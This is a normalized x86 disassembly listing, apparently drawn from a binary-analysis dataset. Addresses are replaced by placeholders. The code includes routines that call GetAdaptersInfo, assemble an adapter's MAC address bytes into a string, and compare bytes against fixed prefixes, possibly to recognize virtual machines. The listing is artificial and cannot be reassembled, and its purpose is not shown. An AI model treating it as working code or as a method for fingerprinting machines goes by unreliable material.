imul ecx
add edx ecx
mov ecx [ esp + 0x5c ]
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp ecx eax
jae r-xdata
cmp bl 0x6
jne r-xdata
mov cl [ eax + 0x1 ]
test cl cl
jne r-xdata
cmp cl 0x50
jne r-xdata
mov dl [ eax + 0x2 ]
test dl dl
jne r-xdata
cmp [ eax + 0x3 ] cl
jne r-xdata
mov eax 0x1
jmp r-xdata
xor esi esi
lea esp [ esp ]
xor eax eax
jmp r-xdata
mov cl [ eax + 0x1 ]
test cl cl
jne r-xdata
cmp cl 0x50
jne r-xdata
cmp [ eax + 0x2 ] 0x4c
jne r-xdata
cmp cl 0xe0
jne r-xdata
cmp [ eax + 0x2 ] 0x56
jne r-xdata
mov dl [ eax + 0x3 ]
test dl dl
jne r-xdata
cmp [ eax + 0x4 ] cl
jne r-xdata
mov ecx [ esp + 0x48 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
mov ecx [ esp + 0x3c ]
pop ebx
call sub_42e72f
add esp 0x48
retn 0x8
inc esi
cmp esi 0xc
jb r-xdata
mov eax [ edi + 0x4 ]
lea ecx [ eax + ebp ]
push esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator[]@IAT ]
cmp [ eax ] 0x4e
jne r-xdata
cmp [ eax + 0x2 ] 0xaf
jne r-xdata
cmp [ eax + 0x2 ] 0xf2
jne r-xdata
mov dl 0x4f
cmp [ eax + 0x3 ] dl
jne r-xdata
cmp [ eax + 0x2 ] 0x6
jne r-xdata
cmp [ eax + 0x3 ] 0xc0
je r-xdata
mov dl [ eax + 0x4 ]
test dl dl
jne r-xdata
cmp [ eax + 0x5 ] cl
je r-xdata
mov eax [ edi + 0x4 ]
lea ecx [ eax + ebp ]
push esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator[]@IAT ]
mov cl [ esi + ebx ]
cmp cl [ eax ]
je r-xdata
inc [ esp + 0x5c ]
add ebp 0x1c
jmp r-xdata
mov [ esp + 0x54 ] 0xffffffff
lea ecx [ esp + 0x2c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
xor al al
jmp r-xdata
cmp [ eax + 0x3 ] 0x9
jne r-xdata
cmp [ eax + 0x3 ] 0x3d
jne r-xdata
cmp [ eax + 0x4 ] dl
jne r-xdata
cmp [ eax + 0x3 ] 0x9
jne r-xdata
mov dl [ eax + 0x5 ]
test dl dl
je r-xdata
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
pop ebp
cmp [ eax + 0x4 ] 0xc
jne r-xdata
mov cl [ eax + 0x4 ]
test cl cl
jne r-xdata
cmp [ eax + 0x5 ] 0x50
je r-xdata
cmp [ eax + 0x4 ] 0x55
jne r-xdata
mov cl [ eax + 0x5 ]
test cl cl
jne r-xdata
cmp [ eax + 0x5 ] 0x1
je r-xdata
cmp [ eax + 0x5 ] 0x66
je r-xdata
sub_41f130
push ebp
mov ebp esp
push 0xffffffff
push sub_432000
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] 0x0
mov ebx [ ebp + 0x14 ]
mov edi [ ebp + 0xc ]
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x10 ]
push eax
push esi
mov ecx ebx
call sub_41b080
dec edi
mov [ ebp + 0xc ] edi
add esi 0x1c
mov [ ebp + 0x8 ] esi
jmp r-xdata
test edi edi
jbe r-xdata
sub_41f1c0
push ecx
mov eax [ esp ]
mov ecx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
push eax
mov eax [ esp + 0x10 ]
push ecx
mov ecx [ esp + 0x10 ]
push edx
push eax
push ecx
call sub_41f130
add esp 0x18
retn
sub_41f1f0
mov eax [ esp + 0xc ]
push esi
mov esi [ esp + 0xc ]
push edi
mov edi [ esp + 0xc ]
push eax
push ecx
mov ecx [ esp + 0x1c ]
push ecx
push esi
push edi
call sub_41f130
mov eax esi
imul eax eax 0x1c
add esp 0x14
add eax edi
pop edi
pop esi
retn 0xc
sub_41f220
push ebp
mov ebp esp
push 0xffffffff
push sub_432019
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x50
mov eax [ rw-data ]
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
mov esi ecx
mov [ ebp - 0x3c ] esi
mov eax [ ebp + 0x10 ]
push eax
lea ecx [ ebp - 0x30 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx [ esi + 0x4 ]
cmp ebx ecx
je r-xdata
mov edi [ ebp + 0xc ]
test edi edi
je r-xdata
mov ecx [ esi + 0xc ]
sub ecx ebx
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x30 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
mov ecx [ ebp - 0x14 ]
call sub_42e72f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
test ebx ebx
jne r-xdata
mov ebx [ esi + 0x8 ]
sub ebx [ esi + 0x4 ]
mov eax 0x92492493
imul ebx
add edx ebx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
xor eax eax
jmp r-xdata
mov eax [ esi + 0x4 ]
test eax eax
jne r-xdata
mov ecx esi
call sub_41ad80
mov edx 0x9249249
sub edx eax
cmp edx edi
jae r-xdata
mov ebx [ esi + 0x8 ]
sub ebx [ esi + 0x4 ]
mov eax 0x92492493
imul ebx
add edx ebx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
xor eax eax
jmp r-xdata
mov ecx [ esi + 0x8 ]
mov [ ebp - 0x44 ] ecx
mov edx ecx
mov ebx [ ebp + 0x8 ]
sub edx ebx
mov [ ebp - 0x4c ] edx
mov eax 0x92492493
imul edx
add edx [ ebp - 0x4c ]
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax edi
jae r-xdata
mov eax ecx
shr eax 0x1
mov edx 0x9249249
sub edx eax
cmp edx ecx
jae r-xdata
add eax edi
cmp ecx eax
jae r-xdata
imul edi edi 0x1c
mov eax ecx
sub eax edi
mov [ ebp - 0x48 ] eax
mov edx [ ebp - 0x5c ]
push edx
push esi
push ecx
push ecx
push eax
call sub_41b280
mov [ esi + 0x8 ] eax
mov eax [ ebp - 0x58 ]
push eax
mov ecx [ ebp - 0x44 ]
push ecx
mov edx [ ebp - 0x48 ]
push edx
push ebx
call sub_41e920
lea eax [ ebp - 0x30 ]
push eax
add edi ebx
push edi
push ebx
call sub_41e8f0
add esp 0x30
mov eax edi
imul eax eax 0x1c
mov [ ebp - 0x40 ] eax
add eax ebx
mov edx [ ebp - 0x54 ]
push edx
push esi
push eax
push ecx
push ebx
call sub_41b280
add esp 0x14
mov [ ebp - 0x4 ] 0x3
mov ecx [ esi + 0x8 ]
lea eax [ ebp - 0x30 ]
push eax
sub ecx ebx
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
sub edi ecx
push edi
mov eax [ esi + 0x8 ]
push eax
mov ecx esi
call sub_41f1f0
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp - 0x40 ]
mov edx [ esi + 0x8 ]
add edx eax
mov [ esi + 0x8 ] edx
mov esi edx
lea edx [ ebp - 0x30 ]
push edx
sub esi eax
push esi
push ebx
call sub_41e8f0
add esp 0xc
jmp r-xdata
add ecx eax
xor ecx ecx
jmp r-xdata
mov ebx [ esi + 0x8 ]
sub ebx [ esi + 0x4 ]
mov eax 0x92492493
imul ebx
add edx ebx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
xor eax eax
jmp r-xdata
mov eax [ esi + 0x4 ]
test eax eax
jne r-xdata
imul ecx ecx 0x1c
mov [ ebp - 0x50 ] ecx
push ecx
call sub_42e3bc
add esp 0x4
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x4 ] 0x1
push eax
mov ebx [ ebp + 0x8 ]
push ebx
mov eax [ esi + 0x4 ]
push eax
mov ecx esi
call sub_41b650
mov [ ebp - 0x34 ] eax
lea ecx [ ebp - 0x30 ]
push ecx
push edi
push eax
mov ecx esi
call sub_41f1f0
mov [ ebp - 0x34 ] eax
push eax
mov edx [ esi + 0x8 ]
push edx
push ebx
mov ecx esi
call sub_41b650
xor eax eax
mov [ ebp - 0x4 ] eax
mov ebx [ esi + 0x4 ]
cmp ebx eax
je r-xdata
mov ecx esi
call sub_41a790
mov ecx eax
add ecx edi
add eax edi
cmp ecx eax
jae r-xdata
add edi eax
test ebx ebx
je r-xdata
mov ecx [ esi + 0x8 ]
sub ecx ebx
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
mov ecx [ ebp - 0x50 ]
mov eax [ ebp - 0x38 ]
add ecx eax
mov [ esi + 0xc ] ecx
imul edi edi 0x1c
add edi eax
mov [ esi + 0x8 ] edi
mov [ esi + 0x4 ] eax
jmp r-xdata
mov eax [ esi + 0x8 ]
push eax
push ebx
mov ecx esi
call sub_41b5b0
mov eax [ esi + 0x4 ]
push eax
call ??3@YAXPAX@Z
add esp 0x4
sub_41f497
mov eax [ ebp + 0xc ]
imul eax eax 0x1c
mov ecx [ ebp - 0x3c ]
mov edx [ ecx + 0x8 ]
add edx eax
push edx
mov edx [ ebp + 0x8 ]
add eax edx
push eax
call sub_41b5b0
push 0x0
push 0x0
call _CxxThrowException
sub_41f530
push ebx
mov ebx [ esp + 0xc ]
push esi
push edi
mov edi ecx
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
xor esi esi
jmp r-xdata
mov ecx [ edi + 0x8 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
mov [ esp + 0x14 ] eax
jne r-xdata
mov ecx [ esp + 0x18 ]
push ecx
push 0x1
push ebx
mov ecx edi
call sub_41f220
imul esi esi 0x1c
add esi [ edi + 0x4 ]
mov eax [ esp + 0x10 ]
pop edi
mov [ eax ] esi
pop esi
pop ebx
retn 0xc
mov ecx ebx
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov esi edx
shr esi 0x1f
add esi edx
sub_41f5a0
push ebx
push esi
push edi
mov edi ecx
mov ebx [ edi + 0x4 ]
test ebx ebx
jne r-xdata
mov ecx [ edi + 0x8 ]
sub ecx ebx
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov esi edx
shr esi 0x1f
add esi edx
xor esi esi
jmp r-xdata
mov edx [ esp + 0x10 ]
mov eax [ edi + 0x8 ]
push edx
push eax
lea eax [ esp + 0x18 ]
push eax
mov ecx edi
call sub_41f530
pop edi
pop esi
pop ebx
retn 0x4
mov ecx [ edi + 0xc ]
sub ecx ebx
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp esi eax
jae r-xdata
test ebx ebx
je r-xdata
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x10 ]
mov esi [ edi + 0x8 ]
push eax
push edi
push ecx
push 0x1
push esi
call sub_41f130
add esp 0x14
add esi 0x1c
mov [ edi + 0x8 ] esi
pop edi
pop esi
pop ebx
retn 0x4
sub_41f630
push 0xffffffff
push sub_43209b
mov eax [ fs : 0x0 ]
push eax
mov eax 0x1ea8
mov [ fs : 0x0 ] esp
call sub_42e910
mov eax [ rw-data ]
push ebx
mov ebx [ esp + 0x1ebc ]
push ebp
push esi
push edi
mov [ esp + 0x20 ] ecx
push r--data
mov ecx ebx
mov [ esp + 0x1eb8 ] eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
xor ebp ebp
mov [ esp + 0x14 ] ebp
mov [ esp + 0x18 ] ebp
mov [ esp + 0x1c ] ebp
mov [ esp + 0x1ec0 ] ebp
mov al [ esp + 0x1ecc ]
test al al
je r-xdata
lea edx [ esp + 0x24 ]
lea esi [ esp + 0xb4 ]
push edx
mov eax esi
push eax
mov [ esp + 0x2c ] 0x1e00
call GetAdaptersInfo
test eax eax
jne r-xdata
call sub_427d30
mov edi eax
cmp [ edi + 0x18 ] ebp
je r-xdata
mov [ esp + 0x1ec0 ] 0xffffffff
xor ebx ebx
cmp ebp ebx
je r-xdata
mov edi 0x1
lea ebx [ ebx ]
push r--data
lea ecx [ esp + 0x2c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x1ec0 ] 0x1
push r--data
lea ecx [ esp + 0x9c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x1ec0 ] 0x2
push ebp
lea eax [ esp + 0x2c ]
push eax
lea ecx [ esp + 0xa0 ]
push ecx
mov ecx edi
call sub_4276c0
mov ebp eax
mov [ esp + 0x1ec0 ] 0x1
lea ecx [ esp + 0x98 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x1ec0 ] 0x0
lea ecx [ esp + 0x28 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
xor esi esi
test ebp ebp
jbe r-xdata
mov [ esp + 0x14 ] ebx
mov [ esp + 0x18 ] ebx
mov [ esp + 0x1c ] ebx
xor al al
mov edi [ esp + 0x18 ]
cmp ebp edi
mov esi ebp
je r-xdata
mov esi [ esi ]
test esi esi
je r-xdata
push 0x0
push r--data
lea ecx [ esp + 0xa0 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::find@IAT ]
mov ecx [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::npos@IAT ]
cmp eax [ ecx ]
jne r-xdata
mov ebp [ esp + 0x14 ]
mov bl 0x8
jmp r-xdata
push ebp
call ??3@YAXPAX@Z
add esp 0x4
lea esp [ esp ]
mov [ esp + 0x1ec0 ] 0x0
lea ecx [ esp + 0x98 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x1ec0 ] 0x0
lea ecx [ esp + 0x98 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
inc edi
cmp edi 0xc
jl r-xdata
push 0x0
push r--data
lea ecx [ esp + 0xa0 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::find@IAT ]
mov edx [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::npos@IAT ]
cmp eax [ edx ]
jne r-xdata
push r--data
lea ecx [ esp + 0x48 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x1ec0 ] 0x3
push r--data
lea ecx [ esp + 0x2c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x1ec0 ] 0x4
lea edx [ esp + 0x7c ]
push esi
push edx
call sub_429480
mov [ esp + 0x1ec8 ] 0x5
push eax
lea eax [ esp + 0x6c ]
push r--data
push eax
call sub_410360
add esp 0x14
mov [ esp + 0x1ec0 ] 0x6
lea ecx [ esp + 0x44 ]
push ecx
push eax
lea edx [ esp + 0x30 ]
push edx
lea eax [ esp + 0xa4 ]
push eax
mov ecx edi
call sub_4272d0
mov [ esp + 0x1ec0 ] 0xb
lea ecx [ esp + 0x60 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x1ec0 ] 0xa
lea ecx [ esp + 0x7c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x1ec0 ] 0x9
lea ecx [ esp + 0x28 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x1ec0 ] bl
lea ecx [ esp + 0x44 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
cmp [ esp + 0xac ] 0xc
jne r-xdata
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
add esi 0x1c
cmp esi edi
jne r-xdata
lea ecx [ esi + 0x10c ]
push ecx
lea ecx [ esp + 0x9c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x1ec0 ] 0xc
push 0x0
push r--data
lea ecx [ esp + 0xa0 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::find@IAT ]
mov edx [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::npos@IAT ]
cmp eax [ edx ]
jne r-xdata
jmp r-xdata
push 0x0
push r--data
lea ecx [ esp + 0xa0 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::find@IAT ]
mov ecx [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::npos@IAT ]
cmp eax [ ecx ]
jne r-xdata
mov [ esp + 0x1ec0 ] 0x0
lea ecx [ esp + 0x98 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
inc esi
cmp esi ebp
jb r-xdata
lea ecx [ esp + 0x98 ]
push ecx
lea ecx [ esp + 0x14 ]
call sub_41f5a0
push 0x0
push r--data
lea ecx [ esp + 0xa0 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::find@IAT ]
mov edx [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::npos@IAT ]
cmp eax [ edx ]
jne r-xdata
mov ebx [ esp + 0x1ec8 ]
lea eax [ esp + 0x10 ]
push eax
lea ecx [ esi + 0x194 ]
push ecx
mov ecx [ esp + 0x28 ]
call sub_41eeb0
test al al
je r-xdata
xor edx edx
mov dl [ esi + 0x194 ]
mov ecx ebx
push edx
push 0x1
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::append@IAT ]
xor eax eax
mov al [ esi + 0x195 ]
mov ecx ebx
push eax
push 0x1
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::append@IAT ]
xor ecx ecx
mov cl [ esi + 0x196 ]
push ecx
push 0x1
mov ecx ebx
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::append@IAT ]
xor edx edx
mov dl [ esi + 0x197 ]
mov ecx ebx
push edx
push 0x1
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::append@IAT ]
xor eax eax
mov al [ esi + 0x198 ]
mov ecx ebx
push eax
push 0x1
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::append@IAT ]
xor ecx ecx
mov cl [ esi + 0x199 ]
push ecx
push 0x1
mov ecx ebx
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::append@IAT ]
mov [ esp + 0x1ec0 ] 0x0
lea ecx [ esp + 0x98 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x1ec0 ] 0xffffffff
lea ecx [ esp + 0x10 ]
call sub_41b5e0
mov al 0x1
jmp r-xdata
mov ecx [ esp + 0x1eb8 ]
pop edi
pop esi
pop ebp
mov [ fs : 0x0 ] ecx
mov ecx [ esp + 0x1ea8 ]
pop ebx
call sub_42e72f
add esp 0x1eb4
retn 0x8
sub_41fa80
push 0xffffffff
push sub_4320e5
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x5c
mov eax [ rw-data ]
push esi
mov esi ecx
lea ecx [ esp + 0x24 ]
mov [ esp + 0x5c ] eax
mov [ esp + 0x4 ] 0x0
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x68 ] 0x1
lea ecx [ esp + 0x40 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x68 ] 0x2
push 0x0
lea eax [ esp + 0x28 ]
push eax
mov ecx esi
call sub_41f630
test al al
je r-xdata
lea ecx [ esp + 0x24 ]
push ecx
mov ecx esi
call sub_41e230
test al al
lea ecx [ esp + 0x24 ]
je r-xdata
push 0x0
jmp r-xdata
push r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
push 0xffffffff
push 0x6
lea ecx [ esp + 0x2c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::append@IAT ]
push 0xffffffff
push 0x0
push 0x1
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::append@IAT ]
push 0x1
push 0x1
jmp r-xdata
push 0x2
mov esi [ esp + 0x70 ]
lea ecx [ esp + 0x40 ]
push ecx
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x4 ] 0x1
mov [ esp + 0x68 ] 0x1
lea ecx [ esp + 0x40 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x68 ] 0x0
lea ecx [ esp + 0x24 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx [ esp + 0x60 ]
mov eax esi
mov [ fs : 0x0 ] ecx
mov ecx [ esp + 0x5c ]
pop esi
call sub_42e72f
add esp 0x68
retn 0x4
jmp r-xdata
lea ecx [ esp + 0x2c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::append@IAT ]
mov eax [ esp + 0x38 ]
xor esi esi
test eax eax
jbe r-xdata
push esi
lea ecx [ esp + 0x28 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator[]@IAT ]
xor edx edx
mov dl [ eax ]
lea eax [ esp + 0x8 ]
push edx
push eax
call sub_429290
add esp 0x8
mov [ esp + 0x68 ] 0x3
push eax
lea ecx [ esp + 0x44 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::append@IAT ]
mov [ esp + 0x68 ] 0x2
lea ecx [ esp + 0x8 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov eax [ esp + 0x38 ]
inc esi
cmp esi eax
jb r-xdata
sub_41fbe0
push 0xffffffff
push sub_432137
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x5c
mov eax [ rw-data ]
push ebx
push esi
push edi
mov edi ecx
xor esi esi
lea ecx [ esp + 0x2c ]
mov [ esp + 0x64 ] eax
mov [ esp + 0xc ] esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x70 ] 0x1
lea ecx [ esp + 0x48 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ebx 0x2
mov [ esp + 0x70 ] bl
push 0x1
lea eax [ esp + 0x30 ]
push eax
mov ecx edi
call sub_41f630
test al al
jne r-xdata
cmp [ esp + 0x40 ] esi
jbe r-xdata
lea ecx [ esp + 0x2c ]
push ecx
mov ecx edi
call sub_41e230
test al al
jne r-xdata
lea ecx [ esp + 0x10 ]
push ecx
mov ecx edi
call sub_41e980
mov [ esp + 0x70 ] 0x4
push eax
lea ecx [ esp + 0x4c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::append@IAT ]
mov [ esp + 0x70 ] bl
lea ecx [ esp + 0x10 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea edx [ esp + 0x10 ]
push edx
mov ecx edi
call sub_41e380
mov [ esp + 0x70 ] 0x5
push eax
lea ecx [ esp + 0x4c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::append@IAT ]
mov [ esp + 0x70 ] bl
lea ecx [ esp + 0x10 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov esi [ esp + 0x78 ]
lea eax [ esp + 0x48 ]
push eax
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0xc ] 0x1
mov [ esp + 0x70 ] 0x1
lea ecx [ esp + 0x48 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x70 ] 0x0
lea ecx [ esp + 0x2c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx [ esp + 0x68 ]
pop edi
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
mov ecx [ esp + 0x5c ]
pop ebx
call sub_42e72f
add esp 0x68
retn 0x4
push esi
lea ecx [ esp + 0x30 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator[]@IAT ]
xor edx edx
mov dl [ eax ]
lea eax [ esp + 0x10 ]
push edx
push eax
call sub_429290
add esp 0x8
mov [ esp + 0x70 ] 0x3
push eax
lea ecx [ esp + 0x4c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::append@IAT ]
mov [ esp + 0x70 ] bl
lea ecx [ esp + 0x10 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov eax [ esp + 0x40 ]
inc esi
cmp esi eax
jb r-xdata
push r--data
lea ecx [ esp + 0x30 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
push 0xffffffff
push 0x6
lea ecx [ esp + 0x34 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::append@IAT ]
push 0xffffffff
push ebx
lea ecx [ esp + 0x34 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::append@IAT ]
sub_41fd80
push 0xffffffff
push sub_4321d0
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x130
mov eax [ rw-data ]
push ebx
push ebp
push esi
push edi
mov ebp ecx
xor esi esi
push r--data
lea ecx [ esp + 0x40 ]
mov [ esp + 0x140 ] eax
mov [ esp + 0x18 ] esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov edi 0x1
mov [ esp + 0x148 ] edi
push r--data
lea ecx [ esp + 0x5c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x148 ] 0x2
push r--data
lea ecx [ esp + 0x8c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x148 ] 0x3
push edi
lea eax [ esp + 0x40 ]
push eax
mov ecx ebp
call sub_41f630
cmp al 0x1
jne r-xdata
lea eax [ esp + 0x58 ]
push eax
lea ecx [ esp + 0x8c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator-=@IAT ]
push r--data
lea ecx [ esp + 0x40 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
push r--data
lea ecx [ esp + 0x5c ]
